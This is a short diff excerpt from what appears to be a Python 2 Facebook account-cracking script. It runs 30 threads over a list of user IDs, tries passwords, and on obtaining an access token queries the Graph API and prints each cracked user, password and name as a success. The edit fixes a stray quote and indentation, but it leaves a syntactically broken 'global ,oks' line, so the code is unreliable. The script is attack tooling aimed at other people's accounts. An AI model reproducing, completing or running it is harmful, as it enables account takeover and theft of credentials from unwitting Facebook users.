@@ -301,7 +301,7 @@ def pilih_super():
 																	
 																	
 	def main(arg):																
-		global cekpoint,oks															
+		global ,oks															
 		user = arg															
 		try:															
 			os.mkdir('out')														
@@ -381,9 +381,9 @@ def pilih_super():
 		                                                if 'access_token' in q:															
 		                                                    x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])															
 		                                                    z = json.loads(x.text)															
-		                                                    print "\033[37;1m[\033[32;1msucces\033[37;1m]\033[32;1m•>\033[37;1m "+user+"\033[36;1m |\033[37;1m "+pass9+"\033[36;1m |\033[37;1m "+z['name']"															
-	except:															
-	pass														
+		                                                    print "\033[37;1m[\033[32;1msucces\033[37;1m]\033[32;1m•>\033[37;1m "+user+"\033[36;1m |\033[37;1m "+pass9+"\033[36;1m |\033[37;1m "+z['name']
+								except:	
+								pass														
 																	
 	p = ThreadPool(30)																
 	p.map(main, id)																
